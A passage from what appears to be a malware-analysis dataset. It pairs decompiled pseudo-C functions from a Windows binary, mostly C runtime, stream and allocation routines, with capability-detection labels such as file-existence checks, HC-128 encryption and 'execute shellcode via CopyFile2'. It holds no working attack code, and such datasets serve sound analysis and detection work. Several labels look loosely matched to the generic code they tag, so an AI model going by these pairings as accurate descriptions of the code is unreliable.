iVar3) = 0x140012a80;\n            sub.msvcrt.dll_memset(pcVar5, 0x30, iVar7);\n            goto code_r0x000140012a80;\n        }\n        pcVar6 = pcVar1;\n        if (pcVar1 != pcVar5) goto code_r0x000140012a91;\n    }\n    *pcVar6 = '0';\n    pcVar5 = pcVar6 + 1;\ncode_r0x000140012a91:\n    if (0 < iVar2) {\n        iVar2 = iVar2 - (pcVar5 - pcVar1);\n        *(arg4 + 0xc) = iVar2;\n        if (0 < iVar2) {\n            if ((uVar9 & 0x1c0) != 0) {\n                *(arg4 + 0xc) = iVar2 + -1;\n            }\n            if ((iVar8 < 0) && ((uVar9 & 0x600) == 0x200)) {\n                iVar8 = *(arg4 + 0xc);\n                *(arg4 + 0xc) = iVar8 + -1;\n                if (0 < iVar8) {\n                    *(&stack0xffffffffffffff90 + iVar3) = 0x140012c79;\n                    sub.msvcrt.dll_memset(pcVar5, 0x30, iVar8);\n                    *(arg4 + 0xc) = 0xffffffff;\n                    pcVar5 = pcVar5 + iVar8;\n                }\n            }\n            else if (((uVar9 & 0x400) == 0) && (iVar8 = *(arg4 + 0xc),  *(arg4 + 0xc) = iVar8 + -1,  0 < iVar8)) {\n                do {\n                    *(&stack0xffffffffffffff90 + iVar3) = 0x140012cad;\n                    fcn.140012060(0x20, arg4);\n                    iVar8 = *(arg4 + 0xc);\n                    *(arg4 + 0xc) = iVar8 + -1;\n                } while (0 < iVar8);\n                uVar9 = *(arg4 + 1);\n            }\n        }\n    }\n    if ((uVar9 & 0x80) == 0) {\n        if ((uVar9 & 0x100) == 0) {\n            if ((uVar9 & 0x40) != 0) {\n                *pcVar5 = ' ';\n                pcVar5 = pcVar5 + 1;\n            }\n        }\n        else {\n            *pcVar5 = '+';\n            pcVar5 = pcVar5 + 1;\n        }\n    }\n    else {\n        *pcVar5 = '-';\n        pcVar5 = pcVar5 + 1;\n    }\n    if (pcVar1 < pcVar5) {\n        do {\n            pcVar5 = pcVar5 + -1;\n            if (((uVar9 & 0x4000) == 0) && (iVar8 = *(arg4 + 0x24),  *(arg4 + 5) == iVar8 || *(arg4 + 5) < iVar8)) {\ncode_r0x000140012afa:\n                *(arg4 + 0x24) = iVar8 + 1;\n            }\n            else {\n                if ((uVar9 & 0x2000) == 0) {\n                    *(*arg4 + *(arg4 + 0x24)) = *pcVar5;\n                    iVar8 = *(arg4 + 0x24);\n                    goto code_r0x000140012afa;\n                }\n                *(&stack0xffffffffffffff90 + iVar3) = 0x140012b32;\n                sub.msvcrt.dll_fputc();\n                *(arg4 + 0x24) = *(arg4 + 0x24) + 1;\n            }\n            if (pcVar1 == pcVar5) break;\n            uVar9 = *(arg4 + 1);\n        } while( true );\n    }\n    iVar8 = *(arg4 + 0xc);\n    while( true ) {\n        *(arg4 + 0xc) = iVar8 + -1;\n        if (iVar8 < 1) break;\n        if (((*(arg4 + 1) & 0x4000) != 0) ||\n           (iVar2 = *(arg4 + 0x24),  iVar8 = iVar8 + -1,  *(arg4 + 5) != iVar2 && iVar2 <= *(arg4 + 5))) {\n            if ((*(arg4 + 1) & 0x2000) == 0) {\n                *(*arg4 + *(arg4 + 0x24)) = 0x20;\n                iVar2 = *(arg4 + 0x24);\n                iVar8 = *(arg4 + 0xc);\n            }\n            else {\n                *(&stack0xffffffffffffff90 + iVar3) = 0x140012b8a;\n                sub.msvcrt.dll_fputc();\n                iVar2 = *(arg4 + 0x24);\n                iVar8 = *(arg4 + 0xc);\n            }\n        }\n        *(arg4 + 0x24) = iVar2 + 1;\n    }\n    return;\n}\n",
        "token_count": 2140
    },
    "140023f1": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint64_t fcn.140023f10(int64_t **arg1, int64_t **arg2)\n\n{\n    int64_t *piVar1;\n    bool bVar2;\n    int32_t iVar3;\n    uint64_t in_RAX;\n    uint64_t uVar4;\n    bool bVar5;\n    \n    piVar1 = *arg1;\n    uVar4 = in_RAX & 0xffffffffffffff00;\n    bVar2 = piVar1 != NULL && *(arg1 + 1) == -1;\n    bVar5 = *(arg1 + 1) == -1;\n    if (bVar2) {\n        uVar4 = piVar1[3];\n        if (uVar4 <= piVar1[2]) {\n            uVar4 = (**(*piVar1 + 0x48))();\n            if (uVar4 == -1) {\n                *arg1 = NULL;\n                bVar5 = bVar2;\n                goto code_r0x000140023f36;\n            }\n        }\n        bVar5 = false;\n    }\ncode_r0x000140023f36:\n    piVar1 = *arg2;\n    bVar2 = *(arg2 + 1) == -1;\n    uVar4 = uVar4 & 0xffffffffffffff00;\n    if (piVar1 == NULL || !bVar2) {\ncode_r0x000140023f4a:\n        return uVar4 | bVar5 == bVar2;\n    }\n    if (piVar1[3] <= piVar1[2]) {\n        iVar3 = (**(*piVar1 + 0x48))();\n        uVar4 = 0;\n        if (iVar3 == -1) {\n            *arg2 = NULL;\n            bVar2 = piVar1 != NULL && bVar2;\n            goto code_r0x000140023f4a;\n        }\n    }\n    return bVar5 == false;\n}\n",
        "token_count": 426
    },
    "140023fd": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint64_t fcn.140023fd0(int64_t **arg1)\n\n{\n    int64_t *piVar1;\n    uint64_t uVar2;\n    \n    uVar2 = *(arg1 + 1);\n    piVar1 = *arg1;\n    if ((*(arg1 + 1) == 0xffffffff) && (piVar1 != NULL)) {\n        if (piVar1[2] < piVar1[3]) {\n            return *piVar1[2];\n        }\n        uVar2 = (**(*piVar1 + 0x48))();\n        if (uVar2 == -1) {\n            *arg1 = NULL;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 156
    },
    "1400723b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nchar * fcn.1400723b0(uchar *arg1, char **arg2, ulong arg3)\n\n{\n    uint8_t uVar1;\n    int64_t *piVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    char **arg1_00;\n    int64_t iVar6;\n    char *pcVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    char *pcVar10;\n    uint8_t *puVar11;\n    uint64_t arg2_00;\n    int64_t iVar12;\n    uchar auStack88 [8];\n    ulong uStack80;\n    \n    pcVar7 = *arg2;\n    *arg1 = 0;\n    cVar3 = arg3;\n    iVar6 = *(pcVar7 + -0x18) + arg2;\n    uVar9 = *(iVar6 + 0x20);\n    pcVar10 = uVar9;\n    if (uVar9 != 0) goto code_r0x000140072405;\n    pcVar7 = *(iVar6 + 0xd8);\n    if (pcVar7 == NULL) {\n        if ((cVar3 != '\\0') || ((*(iVar6 + 0x19) & 0x10) == 0)) goto code_r0x000140072423;\ncode_r0x000140072430:\n        piVar2 = *(iVar6 + 0xe8);\n        if (piVar2[2] < piVar2[3]) {\n            iVar12 = *(iVar6 + 0xf0);\n            pcVar7 = *piVar2[2];\n            if (iVar12 == 0) {\ncode_r0x00014007250d:\n                uStack80 = 0x140072512;\n                arg1_00 = fcn.1400b7000();\n                if (pcVar10 == 0x1) {\n                    uStack80 = 0x140072520;\n                    fcn.1400b6670(arg1_00);\n                    arg2 = arg2 + *(*arg2 + -0x18);\n                    uStack80 = 0x140072534;\n                    arg1_00 = arg2;\n                    fcn.1400ae6c0(arg2, 1);\n                    uStack80 = 0x140072539;\n                    fcn.1400b6b70();\n                }\n                uStack80 = 0x14007253e;\n                fcn.1400b6670(arg1_00);\n                uStack80 = 0x140072552;\n                fcn.1400ae6c0(*(*arg2 + -0x18) + arg2, 1);\n                uStack80 = 0x140072557;\n                fcn.1400b6850();\ncode_r0x00014007248f:\n                pcVar7 = *arg2;\n                iVar6 = arg2 + *(pcVar7 + -0x18);\n                goto code_r0x0001400723fe;\n            }\ncode_r0x000140072458:\n            do {\n                uVar1 = *(*(iVar12 + 0x30) + (pcVar7 & 0xff) * 2);\n                while( true ) {\n                    if ((uVar1 & 0x20) == 0) goto code_r0x00014007248f;\n                    puVar11 = piVar2[3];\n                    if (piVar2[2] < puVar11) {\n                        puVar5 = piVar2[2] + 1;\n                        piVar2[2] = puVar5;\n                    }\n                    else {\n                        uStack80 = 0x1400724a9;\n                        iVar4 = (**(*piVar2 + 0x50))(piVar2);\n                        if (iVar4 == -1) goto code_r0x0001400724ce;\n                        puVar5 = piVar2[2];\n                        puVar11 = piVar2[3];\n                    }\n                    if (puVar11 <= puVar5) break;\n                    uVar1 = *(*(iVar12 + 0x30) + *puVar5 * 2);\n                }\n                uStack80 = 0x1400724c9;\n                pcVar7 = (**(*piVar2 + 0x48))(piVar2);\n            } while (pcVar7 != -1);\ncode_r0x0001400724ce:\n            pcVar7 = *arg2;\n            iVar6 = arg2 + *(pcVar7 + -0x18);\n        }\n        else {\n            uStack80 = 0x1400724ec;\n            pcVar7 = (**(*piVar2 + 0x48))(piVar2);\n            pcVar10 = *arg2;\n            iVar6 = *(pcVar10 + -0x18) + arg2;\n            iVar12 = *(iVar6 + 0xf0);\n            if (iVar12 == 0) goto code_r0x00014007250d;\n            if (pcVar7 != -1) goto code_r0x000140072458;\n        }\n        uVar9 = *(iVar6 + 0x20) | 2;\n    }\n    else {\n        uStack80 = 0x1400723e9;\n        fcn.1400738e0(pcVar7);\n        pcVar7 = *arg2;\n        iVar6 = *(pcVar7 + -0x18) + arg2;\n        if ((cVar3 == '\\0') && ((*(iVar6 + 0x19) & 0x10) != 0)) goto code_r0x000140072430;\ncode_r0x0001400723fe:\n        uVar9 = *(iVar6 + 0x20);\n        if (uVar9 == 0) {\ncode_r0x000140072423:\n            *arg1 = 1;\n            return pcVar7;\n        }\n    }\ncode_r0x000140072405:\n    uVar8 = uVar9 | 4;\n    if (*(iVar6 + 0xe8) == 0) {\n        uVar8 = uVar9 | 5;\n    }\n    *(iVar6 + 0x20) = uVar8;\n    uVar8 = uVar8 & *(iVar6 + 0x1c);\n    arg2_00 = uVar8;\n    if (uVar8 == 0) {\n        return pcVar7;\n    }\n    pcVar7 = \"basic_ios::clear\";\n    fcn.1400b76e0(\"basic_ios::clear\");\n    fcn.14009fa10(pcVar7, arg2_00 + 0xd0);\n    fcn.1400ad170(&stack0xffffffffffffffa8, arg2_00, arg3);\n    fcn.14009fb20(&stack0xffffffffffffffa8);\n    fcn.1400ae6e0(arg2_00, arg3);\n    piVar2 = *(arg2_00 + 0xe8);\n    if (piVar2 != NULL) {\n        fcn.14009fa10(&stack0xffffffffffffffa8, piVar2 + 7);\n        (**(*piVar2 + 0x10))(piVar2, arg3);\n        fcn.14009fb80(piVar2 + 7, arg3);\n        fcn.14009fb20(&stack0xffffffffffffffa8);\n    }\n    return pcVar7;\n}\n",
        "token_count": 1630
    },
    "140073f2": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.140073f20(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    \n    piVar1 = *(arg1 + 8);\n    iVar4 = *(*piVar1 + -0x18);\n    if ((*(piVar1 + iVar4 + 0x19) & 0x20) != 0) {\n        cVar2 = fcn.1400b15e0();\n        if ((cVar2 == '\\0') && (piVar1 = *(piVar1 + iVar4 + 0xe8),  piVar1 != NULL)) {\n            iVar3 = (**(*piVar1 + 0x30))();\n            if (iVar3 == -1) {\n                iVar4 = *(arg1 + 8) + *(**(arg1 + 8) + -0x18);\n                fcn.1400ae9f0(iVar4, *(iVar4 + 0x20) | 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 240
    },
    "14007c0a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint64_t fcn.14007c0a0(ulong *arg1, ulong arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    \n    pcVar1 = _sym.imp.msvcrt.dll__errno;\n    do {\n        uVar2 = sub.msvcrt.dll__fileno_1(*arg1);\n        iVar3 = sub.msvcrt.dll__read(uVar2, arg2, arg3);\n        if (iVar3 != -1) {\n            return iVar3;\n        }\n        piVar4 = (*pcVar1)();\n    } while (*piVar4 == 4);\n    return iVar3;\n}\n",
        "token_count": 160
    },
    "14007c12": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint64_t fcn.14007c120(ulong arg1, int64_t arg2, uint64_t arg3)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint64_t uVar5;\n    \n    uVar2 = fcn.14007bef0(arg1);\n    pcVar1 = _sym.imp.msvcrt.dll__errno;\n    uVar5 = arg3;\n    while( true ) {\n        while( true ) {\n            iVar3 = sub.msvcrt.dll__write(uVar2, arg2, uVar5 & 0xffffffff);\n            if (iVar3 != -1) break;\n            piVar4 = (*pcVar1)();\n            if (*piVar4 != 4) {\n                return arg3 - uVar5;\n            }\n        }\n        uVar5 = uVar5 - iVar3;\n        if (uVar5 == 0) break;\n        arg2 = arg2 + iVar3;\n    }\n    return arg3;\n}\n",
        "token_count": 230
    },
    "14007c2c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint64_t fcn.14007c2c0(ulong arg1, int64_t arg2, uint64_t arg3, int64_t arg4)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint64_t uVar5;\n    uint64_t in_stack_00000028;\n    \n    uVar2 = fcn.14007bef0(arg1);\n    pcVar1 = _sym.imp.msvcrt.dll__errno;\n    uVar5 = arg3;\n    if (arg3 == 0) {\ncode_r0x00014007c340:\n        uVar2 = fcn.14007bef0(arg1);\n        pcVar1 = _sym.imp.msvcrt.dll__errno;\n        uVar5 = in_stack_00000028;\n        do {\n            while( true ) {\n                iVar3 = sub.msvcrt.dll__write(uVar2, arg4, uVar5 & 0xffffffff);\n                if (iVar3 == -1) break;\n                uVar5 = uVar5 - iVar3;\n                if (uVar5 == 0) goto code_r0x00014007c32d;\n                arg4 = arg4 + iVar3;\n            }\n            piVar4 = (*pcVar1)();\n        } while (*piVar4 == 4);\n        in_stack_00000028 = in_stack_00000028 - uVar5;\n    }\n    else {\n        do {\n            while( true ) {\n                iVar3 = sub.msvcrt.dll__write(uVar2, arg2, uVar5 & 0xffffffff);\n                if (iVar3 == -1) break;\n                uVar5 = uVar5 - iVar3;\n                if (uVar5 == 0) goto code_r0x00014007c340;\n                arg2 = arg2 + iVar3;\n            }\n            piVar4 = (*pcVar1)();\n        } while (*piVar4 == 4);\n        in_stack_00000028 = -uVar5;\n    }\ncode_r0x00014007c32d:\n    return arg3 + in_stack_00000028;\n}\n",
        "token_count": 474
    },
    "14009c84": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.14009c840(int64_t arg1)\n\n{\n    uchar uVar1;\n    ushort uVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    \n    iVar5 = 0;\n    do {\n        iVar3 = fcn.14000f950();\n        if (iVar3 == -1) {\n            uVar1 = 0;\n            goto code_r0x00014009c86f;\n        }\n        *(arg1 + 0x19 + iVar5) = iVar3;\n        iVar5 = iVar5 + 1;\n    } while (iVar5 != 0x80);\n    uVar1 = 1;\ncode_r0x00014009c86f:\n    *(arg1 + 0x18) = uVar1;\n    uVar4 = 0;\n    do {\n        uVar2 = fcn.14000f8e0(uVar4 & 0xffffffff);\n        *(arg1 + 0x9a + uVar4 * 2) = uVar2;\n        uVar4 = uVar4 + 1;\n    } while (uVar4 != 0x100);\n    iVar5 = 0;\n    do {\n        *(arg1 + 0x29a + iVar5 * 2) = 1 << (iVar5 & 0x1f);\n        uVar2 = fcn.140025e80();\n        *(arg1 + 0x2ba + iVar5 * 2) = uVar2;\n        iVar5 = iVar5 + 1;\n    } while (iVar5 != 0x10);\n    return;\n}\n",
        "token_count": 362
    },
    "14008e2e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.14008e2e0(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    \n    piVar1 = *(arg1 + 8);\n    iVar4 = *(*piVar1 + -0x18);\n    if ((*(piVar1 + iVar4 + 0x19) & 0x20) != 0) {\n        cVar2 = fcn.1400b15e0();\n        if ((cVar2 == '\\0') && (piVar1 = *(piVar1 + iVar4 + 0xe8),  piVar1 != NULL)) {\n            iVar3 = (**(*piVar1 + 0x30))();\n            if (iVar3 == -1) {\n                iVar4 = *(arg1 + 8) + *(**(arg1 + 8) + -0x18);\n                fcn.1400af3c0(iVar4, *(iVar4 + 0x20) | 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 242
    },
    "1400957e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint64_t fcn.1400957e0(int64_t *arg1, uchar *arg2, int64_t arg3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    \n    iVar6 = 0;\n    if (arg3 < 1) {\n        return 0;\n    }\n    do {\n        iVar4 = arg1[2];\n        iVar5 = arg1[3] - iVar4;\n        if (iVar5 != 0) {\n            iVar7 = arg3 - iVar6;\n            if (iVar7 < iVar5) {\n                sub.msvcrt.dll_memcpy(arg2, iVar4, iVar7);\n                arg1[2] = arg1[2] + iVar7;\n                return arg3;\n            }\n            iVar6 = iVar6 + iVar5;\n            iVar4 = sub.msvcrt.dll_memcpy(arg2, iVar4, iVar5);\n            arg1[2] = arg1[2] + iVar5;\n            if (arg3 <= iVar6) {\n                return iVar6;\n            }\n            arg2 = iVar5 + iVar4;\n        }\n        pcVar1 = *(*arg1 + 0x50);\n        if (pcVar1 == 0x1400955a0) {\n            pcVar1 = *(*arg1 + 0x48);\n            if (pcVar1 == 0x140095b90) {\n                return iVar6;\n            }\n            iVar2 = (*pcVar1)(arg1);\n            if (iVar2 == -1) {\n                return iVar6;\n            }\n            uVar3 = *arg1[2];\n            arg1[2] = arg1[2] + 1;\n        }\n        else {\n            uVar3 = (*pcVar1)(arg1);\n            if (uVar3 == 0xffffffff) {\n                return iVar6;\n            }\n        }\n        iVar6 = iVar6 + 1;\n        *arg2 = uVar3;\n        arg2 = arg2 + 1;\n        if (arg3 <= iVar6) {\n            return iVar6;\n        }\n    } while( true );\n}\n",
        "token_count": 490
    },
    "14009c63": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.14009c630(int64_t *arg1, int64_t arg2, ulong arg3, int64_t arg4)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    ulong *puVar3;\n    \n    *(arg1 + 4) = 0x0;\n    *(arg1 + 0x39) = 0;\n    *(arg1 + 1) = arg4 != 0;\n    iVar1 = *0x140103450;\n    *(arg1 + 0x131) = 0;\n    *arg1 = iVar1 + 0x10;\n    *(arg1 + 3) = arg2 != 0 & arg3;\n    if (arg2 == 0) {\n        arg2 = 0x14010c740;\n    }\n    puVar3 = arg1 + 0x41U & 0xfffffffffffffff8;\n    arg1[6] = arg2;\n    uVar2 = (arg1 - puVar3) + 0x139U >> 3;\n    for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *(arg1 + 7) = 0;\n    *(arg1 + 0x139) = 0;\n    puVar3 = arg1 + 0x141U & 0xfffffffffffffff8;\n    *(arg1 + 0x231) = 0;\n    uVar2 = (arg1 - puVar3) + 0x239U >> 3;\n    for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *(arg1 + 0x239) = 0;\n    return;\n}\n",
        "token_count": 423
    },
    "1400b652": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nulong * fcn.1400b6520(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    ulong arg2;\n    ulong uVar3;\n    char cVar4;\n    ulong *puVar5;\n    code *pcVar6;\n    int64_t *piVar7;\n    int64_t **ppiVar8;\n    ulong arg1_00;\n    uint64_t uVar9;\n    int64_t iVar10;\n    ulong *puVar11;\n    uchar auStack288 [16];\n    ulong uStack272;\n    int64_t *piStack240;\n    \n    iVar10 = 1;\n    if (arg1 != 0) {\n        iVar10 = arg1;\n    }\n    while( true ) {\n        puVar5 = sub.msvcrt.dll_malloc(iVar10);\n        if (puVar5 != NULL) {\n            return puVar5;\n        }\n        pcVar6 = fcn.1400b05d0();\n        if (pcVar6 == NULL) break;\n        (*pcVar6)();\n    }\n    piVar7 = fcn.1400b6600(8);\n    *piVar7 = *0x140103570 + 0x10;\n    fcn.1400b6bc0(piVar7, 0x1401063b0, fcn.1400ae670);\n    puVar5 = sub.msvcrt.dll_malloc(0x90);\n    if (puVar5 == NULL) {\n        iVar10 = 0x90;\n        puVar5 = fcn.14001a310(0x90);\n        if (puVar5 == NULL) {\n            fcn.1400b2e40();\n            piVar7 = iVar10 + 0xa0;\n            puVar5 = sub.msvcrt.dll_malloc();\n            if ((puVar5 != NULL) || (puVar5 = fcn.14001a310(piVar7),  puVar5 != NULL)) {\n                *puVar5 = 0;\n                puVar5[0x13] = 0;\n                puVar11 = puVar5 + 1 & 0xfffffffffffffff8;\n                for (uVar9 = (puVar5 - (puVar5 + 1 & 0xfffffffffffffff8)) + 0xa0U >> 3; uVar9 != 0; uVar9 = uVar9 - 1) {\n                    *puVar11 = 0;\n                    puVar11 = puVar11 + 1;\n                }\n                return puVar5 + 0x14;\n            }\n            fcn.1400b2e40();\n            ppiVar8 = fcn.1400b6970();\n            piVar1 = piVar7 + -10;\n            piStack240 = *ppiVar8;\n            if (*piVar7 + 0xb8b1aabcbcd4d500U < 2) {\n                iVar2 = *(piVar7 + -5);\n                if (iVar2 < 0) {\n                    iVar2 = -iVar2;\n                }\n                *(piVar7 + -5) = iVar2 + 1;\n                *(ppiVar8 + 1) = *(ppiVar8 + 1) + -1;\n                if (piStack240 != piVar1) {\n                    piVar7[-6] = piStack240;\n                    *ppiVar8 = piVar1;\n                }\n                return piVar7[-1];\n            }\n            if (piStack240 == NULL) {\n                *ppiVar8 = piVar1;\n                return NULL;\n            }\n            fcn.1400b2e40();\n            if ((piStack240 == NULL) || (fcn.1400b6670(piStack240),  1 < *piStack240 + 0xb8b1aabcbcd4d500U)) {\n                fcn.1400b2e40();\n            }\n            iVar10 = piStack240[-7];\n            fcn.140019910();\n            fcn.1400b6670(iVar10);\n            uStack272 = *(iVar10 + -0x10);\n            arg2 = *(iVar10 + -0x18);\n            iVar2 = *(iVar10 + -0x24);\n            uVar3 = *(iVar10 + -0x38);\n            arg1_00 = fcn.140019930(*(iVar10 + -0x40));\n            fcn.1400b6670(arg1_00);\n            piVar7 = fcn.1400b6980();\n            puVar5 = *piVar7;\n            if ((*(puVar5 + 10) & 1) == 0) goto code_r0x0001400b67ea;\n            puVar5 = *puVar5;\n            while( true ) {\n                fcn.140019500(0, arg2, auStack288);\n                cVar4 = fcn.1400195f0(auStack288, puVar5[-0x12], puVar5, iVar2);\n                if (cVar4 != '\\0') break;\n                puVar5 = 0x140105740;\n                cVar4 = fcn.1400195f0(auStack288, 0x140105740, 0, iVar2);\n                if (cVar4 == '\\0') goto code_r0x0001400b680d;\n                piVar7 = fcn.1400b6600(8);\n                *piVar7 = *0x1401032a0 + 0x10;\n                fcn.1400b6bc0(piVar7, 0x140105740, 0x140083310);\ncode_r0x0001400b67ea:\n                puVar5 = puVar5 + 0x12;\n            }\n            fcn.1400b6b70();\ncode_r0x0001400b680d:\n            fcn.140019910(uVar3);\n            ppiVar8 = fcn.1400b6970();\n            piVar7 = *ppiVar8;\n            if (piVar7 != NULL) {\n                if ((*(piVar7 + 10) & 1) != 0) {\n                    piVar7 = *piVar7 + -0x90;\n                }\n                piVar7 = *piVar7;\n            }\n            return piVar7;\n        }\n    }\n    *puVar5 = 0;\n    puVar5[0x11] = 0;\n    puVar11 = puVar5 + 1 & 0xfffffffffffffff8;\n    for (uVar9 = (puVar5 - (puVar5 + 1 & 0xfffffffffffffff8)) + 0x90U >> 3; uVar9 != 0; uVar9 = uVar9 - 1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    return puVar5;\n}\n",
        "token_count": 1509
    },
    "1400b660": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nulong * fcn.1400b6600(int64_t size)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    ulong arg2;\n    ulong uVar3;\n    char cVar4;\n    ulong *puVar5;\n    int64_t **ppiVar6;\n    ulong arg1;\n    int64_t *piVar7;\n    uint64_t uVar8;\n    int64_t arg1_00;\n    ulong *puVar9;\n    uchar auStack208 [16];\n    ulong uStack192;\n    int64_t *piStack160;\n    \n    piVar7 = size + 0xa0;\n    puVar5 = sub.msvcrt.dll_malloc();\n    if (puVar5 != NULL) {\ncode_r0x0001400b6619:\n        *puVar5 = 0;\n        puVar5[0x13] = 0;\n        puVar9 = puVar5 + 1 & 0xfffffffffffffff8;\n        for (uVar8 = (puVar5 - (puVar5 + 1 & 0xfffffffffffffff8)) + 0xa0U >> 3; uVar8 != 0; uVar8 = uVar8 - 1) {\n            *puVar9 = 0;\n            puVar9 = puVar9 + 1;\n        }\n        return puVar5 + 0x14;\n    }\n    puVar5 = fcn.14001a310(piVar7);\n    if (puVar5 != NULL) goto code_r0x0001400b6619;\n    fcn.1400b2e40();\n    ppiVar6 = fcn.1400b6970();\n    piVar1 = piVar7 + -10;\n    piStack160 = *ppiVar6;\n    if (*piVar7 + 0xb8b1aabcbcd4d500U < 2) {\n        iVar2 = *(piVar7 + -5);\n        if (iVar2 < 0) {\n            iVar2 = -iVar2;\n        }\n        *(piVar7 + -5) = iVar2 + 1;\n        *(ppiVar6 + 1) = *(ppiVar6 + 1) + -1;\n        if (piStack160 != piVar1) {\n            piVar7[-6] = piStack160;\n            *ppiVar6 = piVar1;\n        }\n        return piVar7[-1];\n    }\n    if (piStack160 == NULL) {\n        *ppiVar6 = piVar1;\n        return NULL;\n    }\n    fcn.1400b2e40();\n    if (piStack160 != NULL) {\n        fcn.1400b6670(piStack160);\n        if (*piStack160 + 0xb8b1aabcbcd4d500U < 2) goto code_r0x0001400b671a;\n    }\n    fcn.1400b2e40();\ncode_r0x0001400b671a:\n    arg1_00 = piStack160[-7];\n    fcn.140019910();\n    fcn.1400b6670(arg1_00);\n    uStack192 = *(arg1_00 + -0x10);\n    arg2 = *(arg1_00 + -0x18);\n    iVar2 = *(arg1_00 + -0x24);\n    uVar3 = *(arg1_00 + -0x38);\n    arg1 = fcn.140019930(*(arg1_00 + -0x40));\n    fcn.1400b6670(arg1);\n    piVar7 = fcn.1400b6980();\n    puVar5 = *piVar7;\n    if ((*(puVar5 + 10) & 1) == 0) goto code_r0x0001400b67ea;\n    puVar5 = *puVar5;\n    while( true ) {\n        fcn.140019500(0, arg2, auStack208);\n        cVar4 = fcn.1400195f0(auStack208, puVar5[-0x12], puVar5, iVar2);\n        if (cVar4 != '\\0') break;\n        puVar5 = 0x140105740;\n        cVar4 = fcn.1400195f0(auStack208, 0x140105740, 0, iVar2);\n        if (cVar4 == '\\0') goto code_r0x0001400b680d;\n        piVar7 = fcn.1400b6600(8);\n        *piVar7 = *0x1401032a0 + 0x10;\n        fcn.1400b6bc0(piVar7, 0x140105740, 0x140083310);\ncode_r0x0001400b67ea:\n        puVar5 = puVar5 + 0x12;\n    }\n    fcn.1400b6b70();\ncode_r0x0001400b680d:\n    fcn.140019910(uVar3);\n    ppiVar6 = fcn.1400b6970();\n    piVar7 = *ppiVar6;\n    if (piVar7 != NULL) {\n        if ((*(piVar7 + 10) & 1) != 0) {\n            piVar7 = *piVar7 + -0x90;\n        }\n        piVar7 = *piVar7;\n    }\n    return piVar7;\n}\n",
        "token_count": 1192
    },
    "14000ec5": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
